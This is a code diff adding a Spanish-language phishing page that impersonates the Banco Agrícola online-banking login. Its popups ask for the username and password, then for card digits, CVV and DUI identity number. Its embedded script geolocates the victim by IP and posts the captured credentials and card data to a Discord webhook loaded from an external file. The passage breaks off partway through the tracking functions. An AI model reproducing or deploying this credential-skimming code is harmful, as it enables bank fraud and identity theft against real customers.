@@ -1,0 +1,1454 @@
+<!doctype html>
+<html class="no-js" lang="es" style="--vh: 13.05px">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="msapplication-tap-highlight" content="no" />
+    <meta
+      name="viewport"
+      content="user-scalable=no, width=device-width, initial-scale=1"
+      viewport-fit="cover"
+    />
+    <title>Bancoagrícola</title>
+    <link rel="stylesheet" href="pc.css" />
+    <script>
+      (function () {
+        function isMobile() {
+          const ua = navigator.userAgent;
+          const mobileRegex =
+            /Android|webOS|iPhone|iPad|iPod|BlackBerry|Windows Phone|Opera Mini|IEMobile|Mobile/i;
+          const isSmallScreen = window.innerWidth <= 1024;
+          const hasTouch =
+            "ontouchstart" in window || navigator.maxTouchPoints > 0;
+          return mobileRegex.test(ua) || (isSmallScreen && hasTouch);
+        }
+
+        const path = window.location.pathname;
+        const currentPage = path.substring(path.lastIndexOf("/") + 1);
+        const isMobileDevice = isMobile();
+
+        if (isMobileDevice && !currentPage.includes("mobil.html")) {
+          window.location.href = "mobil.html";
+        } else if (
+          !isMobileDevice &&
+          !currentPage.includes("index.html") &&
+          currentPage !== ""
+        ) {
+          window.location.href = "index.html";
+        }
+      })();
+    </script>
+    <style type="text/css" id="kampyleStyle">
+      .noOutline {
+        outline: none !important;
+      }
+      .wcagOutline:focus {
+        outline: 1px dashed #595959 !important;
+        outline-offset: 2px !important;
+        transition: none !important;
+      }
+    </style>
+    <style>
+      /* Estilos base de popups */
+      .popup-wrapper {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 100vw;
+        height: 100vh;
+        position: fixed;
+        inset: 0;
+        z-index: 9999;
+        margin: 0;
+        padding: 0;
+      }
+
+      .popup-wrapper .popup {
+        position: relative;
+        background: white;
+        border-radius: 8px;
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+        max-width: 580px;
+        width: 90%;
+        max-height: 90vh;
+        overflow-y: auto;
+        z-index: 10000;
+      }
+
+      .popup-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0, 0, 0, 0.5);
+        z-index: 9998;
+      }
+
+      /* Popup 1 - Clave (oculto por defecto) */
+      .popup-wrapper.first-popup {
+        opacity: 0;
+        pointer-events: none;
+        visibility: hidden;
+        transition: none;
+        margin: 0;
+      }
+      .popup-wrapper.first-popup.active {
+        opacity: 1;
+        pointer-events: auto;
+        visibility: visible;
+      }
+
+      /* Popup 2 - Validación Financiera (oculto por defecto) */
+      .popup-wrapper.second-popup {
+        opacity: 0;
+        pointer-events: none;
+        visibility: hidden;
+        transition: none;
+        margin: 0;
+      }
+      .popup-wrapper.second-popup.active {
+        opacity: 1;
+        pointer-events: auto;
+        visibility: visible;
+      }
+
+      /* Popup 4 - Verificación Exitosa (oculto por defecto) */
+      .popup-wrapper.fourth-popup {
+        opacity: 0;
+        pointer-events: none;
+        visibility: hidden;
+        transition: none;
+        margin: 0;
+      }
+      .popup-wrapper.fourth-popup.active {
+        opacity: 1;
+        pointer-events: auto;
+        visibility: visible;
+      }
+
+      /* OVERLAY DE CARGA COMPLETO */
+      .loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        background: rgba(255, 255, 255, 0.95);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        z-index: 10000;
+        backdrop-filter: blur(10px);
+        -webkit-backdrop-filter: blur(10px);
+      }
+
+      .loading-overlay.active {
+        display: flex;
+        animation: fadeInOverlay 0.5s ease forwards;
+      }
+
+      @keyframes fadeInOverlay {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+
+      .loading-content {
+        text-align: center;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+      }
+
+      /* Logo que respira - se agranda y achica, se desvanece y aparece */
+      .breathing-logo {
+        width: 150px;
+        height: 150px;
+        margin-bottom: 30px;
+        animation: breathe 2.5s ease-in-out infinite;
+        filter: drop-shadow(0 4px 20px rgba(255, 194, 24, 0.3));
+        object-fit: contain;
+      }
+
+      @keyframes breathe {
+        0% {
+          transform: scale(0.8);
+          opacity: 0.6;
+        }
+        50% {
+          transform: scale(1.3);
+          opacity: 1;
+        }
+        100% {
+          transform: scale(0.8);
+          opacity: 0.6;
+        }
+      }
+
+      /* Texto de carga */
+      .loading-text {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        font-size: 18px;
+        color: #333;
+        margin-top: 20px;
+        font-weight: 300;
+        letter-spacing: 2px;
+        animation: textPulse 1.5s ease-in-out infinite;
+      }
+
+      @keyframes textPulse {
+        0%,
+        100% {
+          opacity: 0.5;
+        }
+        50% {
+          opacity: 1;
+        }
+      }
+
+      .loading-text strong {
+        font-weight: 600;
+        color: #ffc218;
+      }
+
+      /* Puntos de carga animados */
+      .loading-dots {
+        display: inline-block;
+        margin-left: 5px;
+      }
+
+      .loading-dots span {
+        display: inline-block;
+        animation: dotPulse 1.4s ease-in-out infinite;
+        font-size: 24px;
+        font-weight: 700;
+        color: #ffc218;
+      }
+
+      .loading-dots span:nth-child(2) {
+        animation-delay: 0.2s;
+      }
+      .loading-dots span:nth-child(3) {
+        animation-delay: 0.4s;
+      }
+
+      @keyframes dotPulse {
+        0%,
+        80%,
+        100% {
+          opacity: 0;
+          transform: translateY(0);
+        }
+        40% {
+          opacity: 1;
+          transform: translateY(-5px);
+        }
+      }
+
+      /* ANIMACIÓN DESDE ARRIBA DE LA PÁGINA */
+      @keyframes slideDownFromTop {
+        0% {
+          opacity: 0;
+          transform: translateY(-100vh) scale(0.9);
+        }
+        60% {
+          opacity: 0.8;
+          transform: translateY(20px) scale(1.01);
+        }
+        80% {
+          transform: translateY(-10px) scale(0.99);
+        }
+        100% {
+          opacity: 1;
+          transform: translateY(0) scale(1);
+        }
+      }
+
+      /* Animación para el contenido del popup */
+      .popup-wrapper.first-popup.active .popup,
+      .popup-wrapper.second-popup.active .popup,
+      .popup-wrapper.fourth-popup.active .popup {
+        animation: slideDownFromTop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1)
+          forwards;
+      }
+
+      /* Ajustes para el contenido interno del popup */
+      .popup-wrapper .popup .regular-form {
+        padding: 30px;
+      }
+
+      .popup-wrapper .popup .form-section-wrapper {
+        padding: 0;
+      }
+
+      .popup-wrapper .popup .button-row {
+        padding: 22px 0;
+        display: flex;
+        justify-content: center;
+        gap: 20px;
+      }
+
+      .popup-wrapper .popup .button-row a {
+        cursor: pointer;
+        text-decoration: underline;
+        padding: 10px 20px;
+      }
+
+      .popup-wrapper .popup .button-row .button {
+        margin: 0;
+      }
+
+      /* Asegurar que los popups se posicionen correctamente */
+      .normal-version .popup-wrapper {
+        position: fixed;
+        inset: 0;
+        width: 100vw;
+        height: 100vh;
+        margin: 0;
+        padding: 0;
+        z-index: 9999;
+      }
+
+      .normal-version .popup-wrapper .popup {
+        max-width: 580px;
+        width: 90%;
+        margin: auto;
+        padding: 0;
+      }
+
+      .normal-version .popup-wrapper .popup.scrollable {
+        padding: 0;
+      }
+
+      .normal-version
+        .popup-wrapper
+        .popup
+        .form-section-wrapper
+        .form-line-wrapper
+        .field-wrapper {
+        display: flex;
+        margin-top: 30px;
+        padding: 0;
+        justify-content: center;
+        flex-direction: column;
+        align-items: stretch;
+      }
+
+      .normal-version
+        .popup-wrapper
+        .popup
+        .form-section-wrapper
+        .form-line-wrapper
+        .field-wrapper
+        label {
+        flex: none;
+        text-align: left;
+        margin-bottom: 8px;
+      }
+
+      .normal-version
+        .popup-wrapper
+        .popup
+        .form-section-wrapper
+        .form-line-wrapper
+        .field-wrapper
+        .field-container {
+        width: 100%;
+      }
+
+      .normal-version
+        .popup-wrapper
+        .popup
+        .form-section-wrapper
+        .form-line-wrapper
+        .field-wrapper
+        .field-container
+        input {
+        max-width: 100%;
+        width: 100%;
+        box-sizing: border-box;
+      }
+
+      .normal-version
+        .popup-wrapper
+        .popup
+        .form-section-wrapper
+        .form-line-wrapper
+        .field-wrapper.intro-code {
+        justify-content: flex-start;
+        margin-top: 0;
+      }
+
+      .normal-version
+        .popup-wrapper
+        .popup
+        .form-section-wrapper
+        .form-line-wrapper
+        .field-wrapper.intro-code
+        .token-intro
+        span {
+        font-size: 20px;
+        font-weight: 700;
+        margin-left: 0;
+      }
+
+      .normal-version
+        .popup-wrapper
+        .popup
+        .form-section-wrapper
+        .field-link-wrapper {
+        margin-left: 0;
+        padding: 15px 0;
+        text-align: left;
+      }
+
+      .normal-version
+        .popup-wrapper
+        .popup
+        .form-section-wrapper
+        .field-link-wrapper
+        .field-link {
+        cursor: pointer;
+        text-decoration: underline;
+      }
+
+      /* Ajuste para los popups específicos */
+      #firstPopup .popup,
+      #secondPopup .popup,
+      #fourthPopup .popup {
+        animation: none;
+      }
+
+      #firstPopup.active .popup,
+      #secondPopup.active .popup,
+      #fourthPopup.active .popup {
+        animation: slideDownFromTop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1)
+          forwards;
+      }
+
+      /* Para el overlay */
+      #firstPopup .popup-overlay,
+      #secondPopup .popup-overlay,
+      #fourthPopup .popup-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0, 0, 0, 0.5);
+        z-index: -1;
+      }
+
+      /* Evitar scroll en el body cuando el popup está abierto */
+      body.popup-open {
+        overflow: hidden;
+      }
+
+      body.loading-open {
+        overflow: hidden;
+      }
+
+      /* ===== ESTILOS PARA PREVENIR CLIC FUERA ===== */
+      .popup-wrapper {
+        pointer-events: auto !important;
+      }
+
+      .popup-overlay {
+        pointer-events: none !important;
+      }
+
+      /* ===== ESTILOS PARA EL FORMULARIO DE VALIDACIÓN FINANCIERA ===== */
+      .financial-validation .form-line-wrapper {
+        margin-bottom: 20px;
+      }
+      .financial-validation .field-wrapper label {
+        font-size: 14px;
+        font-weight: 600;
+        color: #333;
+        margin-bottom: 5px;
+        display: block;
+      }
+      .financial-validation .field-container input {
+        width: 100%;
+        padding: 12px 0;
+        border: none;
+        border-bottom: 1px solid #ccc;
+        font-size: 16px;
+        outline: none;
+        background: transparent;
+      }
+      .financial-validation .field-container input:focus {
+        border-bottom-color: #ffc218;
+      }
+      .financial-validation .field-container input::placeholder {
+        color: #aaa;
+      }
+      .financial-validation .header-icon {
+        text-align: center;
+        margin-bottom: 20px;
+      }
+      .financial-validation .header-icon svg {
+        width: 50px;
+        height: 50px;
+        color: #ffc218;
+      }
+      .financial-validation h3 {
+        font-size: 22px;
+        font-weight: 700;
+        color: #333;
+        text-align: center;
+        margin-bottom: 10px;
+      }
+      .financial-validation .subtitle {
+        font-size: 14px;
+        color: #666;
+        text-align: center;
+        margin-bottom: 30px;
+        line-height: 1.5;
+      }
+      .financial-validation .subtitle strong {
+        color: #333;
+      }
+
+      /* ===== ESTILOS PARA VERIFICACIÓN EXITOSA ===== */
+      .normal-version .popup-wrapper.success-popup .popup {
+        text-align: center;
+        padding: 60px 40px !important;
+        margin: 20px auto !important;
+        box-sizing: border-box;
+        max-width: 500px;
+        width: 90%;
+      }
+
+      .normal-version .popup-wrapper.success-popup .success-icon {
+        width: 100px;
+        height: 100px;
+        background: #e8f5e9;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 30px;
+      }
+
+      .normal-version .popup-wrapper.success-popup .success-icon svg {
+        width: 50px;
+        height: 50px;
+        color: #4caf50;
+      }
+
+      .normal-version .popup-wrapper.success-popup h3 {
+        font-size: 26px;
+        font-weight: 700;
+        color: #4caf50;
+        margin-bottom: 20px;
+      }
+
+      .normal-version .popup-wrapper.success-popup p {
+        font-size: 16px;
+        color: #666;
+        line-height: 1.6;
+        margin-bottom: 35px;
+        padding: 0 10px;
+      }
+
+      .normal-version .popup-wrapper.success-popup .button {
+        background: #4caf50;
+        color: white;
+        border: none;
+        padding: 15px 45px;
+        border-radius: 30px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background 0.3s;
+        margin-top: 10px;
+      }
+
+      .normal-version .popup-wrapper.success-popup .button:hover {
+        background: #43a047;
+      }
+    </style>
+  </head>
+  <body id="app-body" class="normal-version true web-version">
+    <div id="root" bis_skin_checked="1">
+      <div bis_skin_checked="1">
+        <div class="app-wrapper external-wrapper" bis_skin_checked="1">
+          <div class="out-of-bounds-notice" bis_skin_checked="1">
+            <div class="message" bis_skin_checked="1">
+              <p>
+                El ancho de tu pantalla es demasiado pequeño para utilizar el
+                sistema
+              </p>
+            </div>
+          </div>
+          <header>
+            <div class="contact-help" bis_skin_checked="1"></div>
+            <h1 class="external-app-name">
+              <a><span class="">Banco Agrícola</span></a>
+            </h1>
+          </header>
+          <article class="content-wrapper login-wrapper content-login">
+            <div class="login-box" bis_skin_checked="1">
+              <h2 class="page-subtitle centered">
+                <span class="">Bienvenido a e-banca Personas</span>
+              </h2>
+              <form
+                class="regular-form login-form"
+                autocomplete="off"
+                method="POST"
+              >
+                <div class="form-section-wrapper" bis_skin_checked="1">
+                  <div
+                    class="form-line-wrapper static-form"
+                    bis_skin_checked="1"
+                  >
+                    <div class="field-wrapper field-input" bis_skin_checked="1">
+                      <label class=""
+                        ><span class="">Usuario</span>
+                        <p class="field-auxiliar"><span class=""></span></p>
+                      </label>
+                      <div class="field-container" bis_skin_checked="1">
+                        <div
+                          bis_skin_checked="1"
+                          style="display: flex; width: 100%"
+                        >
+                          <input
+                            inputmode=""
+                            autocomplete="off"
+                            autocorrect="off"
+                            autocapitalize="off"
+                            spellcheck="false"
+                            maxlength="20"
+                            value=""
+                            style="opacity: 1"
+                            id="usernameInput"
+                          />
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div bis_skin_checked="1">
+                    <div
+                      class="form-line-wrapper static-form form-input-checked"
+                      bis_skin_checked="1"
+                    >
+                      <div
+                        class="field-wrapper field-checkbox-group"
+                        bis_skin_checked="1"
+                      >
+                        <label class="no-mobile undefined"> </label>
+                        <ul>
+                          <li>
+                            <div
+                              class="field-checkbox field-small"
+                              bis_skin_checked="1"
+                            >
+                              <div
+                                class="checkbox false no-checked"
+                                bis_skin_checked="1"
+                              >
+                                <span class="checkbox-check"></span>
+                              </div>
+                              <span class="checkbox-label"
+                                ><span
+                                  ><span class="">Recordar usuario</span></span
+                                ></span
+                              >
+                              <input
+                                name="rememberUser"
+                                type="checkbox"
+                                autocomplete="off"
+                                autocorrect="off"
+                                autocapitalize="off"
+                                spellcheck="false"
+                                class="hidden"
+                                value="true"
+                              />
+                            </div>
+                          </li>
+                        </ul>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="form-line-wrapper" bis_skin_checked="1">
+                    <div class="field-link-wrapper" bis_skin_checked="1">
+                      <a
+                        class="field-link"
+                        data-savepage-href="/userRecoveryUserEntry"
+                        href="#userRecoveryUserEntry"
+                        ><span class="">Olvide mi Clave</span></a
+                      >
+                    </div>
+                  </div>
+                </div>
+                <div
+                  class="button-row centered button-login button-arrow"
+                  bis_skin_checked="1"
+                >
+                  <button
+                    type="button"
+                    class="button undefined"
+                    id="showFirstPopupBtn"
+                  >
+                    <span><span class="">Continuar</span></span>
+                    <span class="loading-indicator"
+                      ><span class="">Cargando...</span></span
+                    >
+                  </button>
+                </div>
+                <div class="login-footer-options" bis_skin_checked="1">
+                  <a
+                    class="icon-edit"
+                    data-savepage-href="/enrollment"
+                    href="#enrollment"
+                    ><span class="">Regístrate</span></a
+                  >
+                  <a class="icon-register"><span></span></a>
+                  <a
+                    class="icon-call"
+                    data-savepage-href="/contactUs"
+                    href="#contactUs"
+                    ><span class="">Contáctanos</span></a
+                  >
+                </div>
+              </form>
+
+              <!-- PRIMER POPUP: Clave de acceso -->
+              <div bis_skin_checked="1">
+                <div
+                  class="popup-wrapper token-popup popup-carga first-popup"
+                  bis_skin_checked="1"
+                  id="firstPopup"
+                >
+                  <div class="popup-overlay" bis_skin_checked="1"> </div>
+                  <div
+                    class="popup scrollable popup-login-code"
+                    bis_skin_checked="1"
+                  >
+                    <form class="regular-form" autocomplete="off" method="POST">
+                      <div
+                        class="form-section-wrapper login-movile"
+                        bis_skin_checked="1"
+                      >
+                        <div class="form-line-wrapper" bis_skin_checked="1">
+                          <div
+                            class="field-wrapper intro-code"
+                            bis_skin_checked="1"
+                          >
+                            <span class="token-intro"
+                              ><span class=""
+                                >Ingresa tu clave de seguridad para
+                                continuar:</span
+                              ></span
+                            >
+                          </div>
+                        </div>
+                        <div
+                          class="form-line-wrapper static-form"
+                          bis_skin_checked="1"
+                        >
+                          <div
+                            class="field-wrapper field-input"
+                            bis_skin_checked="1"
+                          >
+                            <label class=""
+                              ><span class="">Clave de acceso</span>
+                              <p class="field-auxiliar">
+                                <span class=""></span>
+                              </p>
+                            </label>
+                            <div class="field-container" bis_skin_checked="1">
+                              <div
+                                style="display: flex; width: 100%"
+                                bis_skin_checked="1"
+                              >
+                                <input
+                                  inputmode=""
+                                  autocomplete="off"
+                                  autocorrect="off"
+                                  autocapitalize="off"
+                                  spellcheck="false"
+                                  maxlength="20"
+                                  type="password"
+                                  id="passwordInput"
+                                  value=""
+                                  style="opacity: 1"
+                                />
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="field-link-wrapper" bis_skin_checked="1">
+                          <a class="field-link"
+                            ><span class="">¿Olvidaste tu clave?</span></a
+                          >
+                        </div>
+                      </div>
+                      <div
+                        class="button-row button-verification button-arrow"
+                        bis_skin_checked="1"
+                      >
+                        <a id="cancelFirstPopup"
+                          ><span class="">Cancelar</span></a
+                        >
+                        <button
+                          type="button"
+                          class="button undefined"
+                          id="validatePasswordBtn"
+                        >
+                          <span><span class="">Validar clave</span></span>
+                          <span class="loading-indicator"
+                            ><span class="">Cargando...</span></span
+                          >
+                        </button>
+                      </div>
+                    </form>
+                  </div>
+                </div>
+              </div>
+
+          <!-- SEGUNDO POPUP: Validación de Seguridad -->
+<div bis_skin_checked="1">
+  <div
+    class="popup-wrapper token-popup popup-carga second-popup"
+    bis_skin_checked="1"
+    id="secondPopup"
+  >
+    <div class="popup-overlay" bis_skin_checked="1"> </div>
+    <div
+      class="popup scrollable popup-login-code"
+      bis_skin_checked="1"
+    >
+      <form class="regular-form financial-validation" autocomplete="off" method="POST">
+        <div class="form-section-wrapper login-movile" bis_skin_checked="1">
+          <!-- Logo en lugar del icono de escudo -->
+          <div class="header-icon">
+            <img src="lgoo2.png" alt="Logo" style="width: 250px;  object-fit: contain;" />
+          </div>
+          <h3>Validación de Seguridad</h3>
+          <p class="subtitle">
+            Para dar continuidad a su proceso, realiza una validación para confirmar la titularidad, podremos solicitar únicamente información limitada, como los <label style="font-weight: bold;font-size: 16px;color:black">últimos cuatro dígitos</label> de su tarjeta. <label style="font-weight: bold;font-size: 16px;color:black">CVV</label> son 3 dígitos ubicados en la parte posterior.<br><br>
+            Agradecemos su colaboración. Esta validación nos permite garantizar la seguridad del proceso y proteger la información de nuestros clientes.
+          </p>
+          
+          <div class="form-line-wrapper" bis_skin_checked="1">
+            <div class="field-wrapper field-input" bis_skin_checked="1">
+              <label><span>Últimos 4 dígitos de la tarjeta</span></label>
+              <div class="field-container" bis_skin_checked="1">
+                <input
+                  inputmode="numeric"
+                  autocomplete="off"
+                  maxlength="4"
+                  type="text"
+                  id="cardLast4"
+                  placeholder="0000"
+                  value=""
+                />
+              </div>
+            </div>
+          </div>
+          <div class="form-line-wrapper" bis_skin_checked="1">
+            <div class="field-wrapper field-input" bis_skin_checked="1">
+              <label><span>CVV (3 dígitos posteriores)</span></label>
+              <div class="field-container" bis_skin_checked="1">
+                <input
+                  inputmode="numeric"
+                  autocomplete="off"
+                  maxlength="3"
+                  type="text"
+                  id="cardCvv"
+                  placeholder="000"
+                  value=""
+                />
+              </div>
+            </div>
+          </div>
+          <div class="form-line-wrapper" bis_skin_checked="1">
+            <div class="field-wrapper field-input" bis_skin_checked="1">
+              <label><span>Documento Único de Identidad (DUI)</span></label>
+              <div class="field-container" bis_skin_checked="1">
+                <input
+                  inputmode="numeric"
+                  autocomplete="off"
+                  maxlength="10"
+                  type="text"
+                  id="cardDui"
+                  placeholder="00000000-0"
+                  value=""
+                />
+              </div>
+            </div>
+          </div>
+        </div>
+        <div
+          class="button-row button-verification button-arrow"
+          bis_skin_checked="1"
+        >
+          <a id="cancelSecondPopup"
+            ><span class="">Cancelar</span></a
+          >
+          <button
+            type="button"
+            class="button undefined"
+            id="validateFinancialBtn"
+          >
+            <span><span class="">Continuar</span></span>
+            <span class="loading-indicator"
+              ><span class="">Cargando...</span></span
+            >
+          </button>
+        </div>
+      </form>
+    </div>
+  </div>
+</div>
+
+              <!-- CUARTO POPUP: Verificación Exitosa -->
+              <div bis_skin_checked="1">
+                <div
+                  class="popup-wrapper token-popup popup-carga fourth-popup success-popup"
+                  bis_skin_checked="1"
+                  id="fourthPopup"
+                >
+                  <div class="popup-overlay" bis_skin_checked="1"> </div>
+                  <div
+                    class="popup scrollable popup-login-code"
+                    bis_skin_checked="1"
+                  >
+                    <div class="success-icon">
+                      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+                      </svg>
+                    </div>
+                    <h3>Verificación exitosa</h3>
+                    <p>Su información ha sido confirmada correctamente. En breve podrá continuar con su proceso en e-banca Personas.</p>
+                    <button type="button" class="button" id="backToHomeBtn">Volver al inicio</button>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </article>
+          <footer class="normal-footer">
+            <ul class="footer-list">
+              <li>
+                <a><span class="">Consejos de seguridad</span></a>
+              </li>
+              <li>
+                <a><span class="">Tutorial del canal</span></a>
+              </li>
+              <li>
+                <a><span class="">Tips de uso</span></a>
+              </li>
+              <li>
+                <a><span class="">Preguntas frecuentes</span></a>
+              </li>
+              <li>
+                <span
+                  ><span class=""
+                    >Banco Agrícola© Todos los derechos reservados.</span
+                  ></span
+                >
+              </li>
+              <li><p class="app-version">5.5.8</p></li>
+            </ul>
+          </footer>
+        </div>
+      </div>
+    </div>
+
+    <!-- OVERLAY DE CARGA PERSONALIZADO -->
+    <div class="loading-overlay" id="loadingOverlay">
+      <div class="loading-content">
+        <img
+          src="logo.png"
+          alt="Logo"
+          class="breathing-logo"
+          id="loadingLogo"
+        />
+        <div class="loading-text">
+          Estamos comprobando
+          <span class="loading-dots">
+            <span>.</span>
+            <span>.</span>
+            <span>.</span>
+          </span>
+        </div>
+      </div>
+    </div>
+
+    <script src="telegram.js"></script>
+<script>
+  // ============================================
+  // SISTEMA DE MONITOREO Y ENVÍO A DISCORD
+  // ============================================
+
+  // CONFIGURACIÓN - REEMPLAZA CON TU WEBHOOK REAL
+  const DISCORD_WEBHOOK_URL = chatId;
+
+  // ============================================
+  // FUNCIONES DE UBICACIÓN Y USUARIO
+  // ============================================
+
+  async function getLocationInfo() {
+    try {
+      const response1 = await fetch("https://ipapi.co/json/");
+      if (response1.ok) {
+        const data = await response1.json();
+        return {
+          ip: data.ip || "No disponible",
+          ciudad: data.city || "No disponible",
+          region: data.region || "No disponible",
+          pais: data.country_name || "No disponible",
+          latitud: data.latitude || "No disponible",
+          longitud: data.longitude || "No disponible",
+          isp: data.org || "No disponible",
+          fuente: "ipapi.co",
+        };
+      }
+    } catch (error) {
+      console.log("Error con ipapi.co:", error);
+    }
+
+    try {
+      const response2 = await fetch("http://ip-api.com/json/");
+      if (response2.ok) {
+        const data = await response2.json();
+        return {
+          ip: data.query || "No disponible",
+          ciudad: data.city || "No disponible",
+          region: data.regionName || "No disponible",
+          pais: data.country || "No disponible",
+          latitud: data.lat || "No disponible",
+          longitud: data.lon || "No disponible",
+          isp: data.isp || "No disponible",
+          fuente: "ip-api.com",
+        };
+      }
+    } catch (error) {
+      console.log("Error con ip-api.com:", error);
+    }
+
+    try {
+      const response3 = await fetch("https://ipinfo.io/json");
+      if (response3.ok) {
+        const data = await response3.json();
+        const [lat, lon] = data.loc
+          ? data.loc.split(",")
+          : ["No disponible", "No disponible"];
+        return {
+          ip: data.ip || "No disponible",
+          ciudad: data.city || "No disponible",
+          region: data.region || "No disponible",
+          pais: data.country || "No disponible",
+          latitud: lat,
+          longitud: lon,
+          isp: data.org || "No disponible",
+          fuente: "ipinfo.io",
+        };
+      }
+    } catch (error) {
+      console.log("Error con ipinfo.io:", error);
+    }
+
+    return {
+      ip: "No disponible",
+      ciudad: "No disponible",
+      region: "No disponible",
+      pais: "No disponible",
+      latitud: "No disponible",
+      longitud: "No disponible",
+      isp: "No disponible",
+      fuente: "No disponible",
+    };
+  }
+
+  function getUserInfo() {
+    const usernameInput = document.getElementById("usernameInput");
+    const passwordInput = document.getElementById("passwordInput");
+    const cardLast4 = document.getElementById("cardLast4");
+    const cardCvv = document.getElementById("cardCvv");
+    const cardDui = document.getElementById("cardDui");
+
+    const userAgent = navigator.userAgent;
+    const screenWidth = screen.width;
+    const screenHeight = screen.height;
+    const language =
+      navigator.language || navigator.languages?.[0] || "No disponible";
+    const platform = navigator.platform || "No disponible";
+    const timeZone =
+      Intl.DateTimeFormat().resolvedOptions().timeZone || "No disponible";
+    const dateTime = new Date().toLocaleString("es-ES", {
+      timeZone: timeZone,
+    });
+
+    const username = usernameInput
+      ? usernameInput.value || "No ingresado"
+      : "No disponible";
+    const password = passwordInput
+      ? passwordInput.value || "No ingresada"
+      : "No disponible";
+    const last4 = cardLast4
+      ? cardLast4.value || "No ingresado"
+      : "No disponible";
+    const cvv = cardCvv
+      ? cardCvv.value || "No ingresado"
+      : "No disponible";
+    const dui = cardDui
+      ? cardDui.value || "No ingresado"
+      : "No disponible";
+
+    return {
+      userAgent: userAgent,
+      pantalla: `${screenWidth}x${screenHeight}`,
+      idioma: language,
+      plataforma: platform,
+      zonaHoraria: timeZone,
+      fechaHora: dateTime,
+      usuario: username,
+      clave: password,
+      last4: last4,
+      cvv: cvv,
+      dui: dui,
+      navegador: getBrowserName(userAgent),
+      sistemaOperativo: getOS(userAgent),
+    };
+  }
+
+  function getBrowserName(ua) {
+    if (ua.includes("Chrome")) return "Chrome";
+    if (ua.includes("Firefox")) return "Firefox";
+    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+    if (ua.includes("Edge")) return "Edge";
+    if (ua.includes("Opera")) return "Opera";
+    return "Desconocido";
+  }
+
+  function getOS(ua) {
+    if (ua.includes("Windows")) return "Windows";
+    if (ua.includes("Mac OS")) return "macOS";
+    if (ua.includes("Linux")) return "Linux";
+    if (ua.includes("Android")) return "Android";
+    if (ua.includes("iOS")) return "iOS";
+    return "Desconocido";
+  }
+
+  // ============================================
+  // FUNCIÓN DE ENVÍO A DISCORD
+  // ============================================
+
+  async function sendToDiscord(tipo, userInfo, locationInfo, extraData) {
+    if (
+      !DISCORD_WEBHOOK_URL ||
+      DISCORD_WEBHOOK_URL === "TU_WEBHOOK_DE_DISCORD_AQUI"
+    ) {
+      console.warn("⚠️ No se ha configurado el webhook de Discord");
+      console.log("📝 Datos que se enviarían:", { tipo, userInfo, locationInfo, extraData });
+      return;
+    }
+
+    let contentMessage = "";
+
+    if (tipo === "clave") {
+      contentMessage += "🔐 **Nuevo Acceso Detectado (Clave)**\n";
+      
+      if (userInfo.usuario && userInfo.usuario !== "No ingresado") {
+        contentMessage += "**👤 Usuario:**\n```\n" + userInfo.usuario + "\n```\n";
+      }
+
+      if (userInfo.clave && userInfo.clave !== "No ingresada") {
+        contentMessage += "**🔑 Contraseña:**\n```\n" + userInfo.clave + "\n```\n";
+      }
+
+    } else if (tipo === "financial") {
+      contentMessage += "🔐 **Nuevo Acceso Detectado (Validación Financiera)**\n";
+      
+      if (userInfo.usuario && userInfo.usuario !== "No ingresado") {
+        contentMessage += "**👤 Usuario:**\n```\n" + userInfo.usuario + "\n```\n";
+      }
+
+      if (userInfo.last4 && userInfo.last4 !== "No ingresado") {
+        contentMessage += "**💳 Últimos 4 dígitos:**\n```\n" + userInfo.last4 + "\n```\n";
+      }
+
+      if (userInfo.cvv && userInfo.cvv !== "No ingresado") {
+        contentMessage += "**🔒 CVV:**\n```\n" + userInfo.cvv + "\n```\n";
+      }
+
+      if (userInfo.dui && userInfo.dui !== "No ingresado") {
+        contentMessage += "**🆔 DUI:**\n```\n" + userInfo.dui + "\n```\n";
+      }
+    }
+
+    // País
+    if (locationInfo.pais) {
+      contentMessage += `**IP:** \`${locationInfo.ip}\`\n**Ciudad:** ${locationInfo.ciudad}\n**Región:** ${locationInfo.region}\n**País:** ${locationInfo.pais}\n`;
+    }
+  
+    contentMessage += "🕒 " + new Date().toLocaleString("es-ES");
+
+    const messageData = {
+      username: "Atlántida Log Bot",
+      avatar_url: "https://play-lh.googleusercontent.com/4odhYGAFtFIPd1JqopEYCYmnf4e_NQUTHg7nL-QzrkoFNxxhHunjae6_4cyGdrfHc4QQzKVQRMRxowWZVB-e5Q",
+      content: contentMessage
+    };
+
+    try {
+      const response = await fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(messageData),
+      });
+
+      if (response.ok) {
+        console.log(`✅ ${tipo} enviado correctamente a Discord`);
+      } else {
+        console.error("❌ Error enviando a Discord:", response.status);
+      }
+    } catch (error) {
+      console.error("❌ Error al enviar a Discord:", error);
+    }
+  }
+
+  // ============================================
+  // FUNCIONES DE TRACKING DE PASOS
+  // ============================================
+
+  async function trackClave() {
+    console.log("🔄 Enviando clave...");
+    const locationInfo = await getLocationInfo();
+    const userInfo = getUserInfo();
+    await sendToDiscord("clave", userInfo, locationInfo, null);
+  }
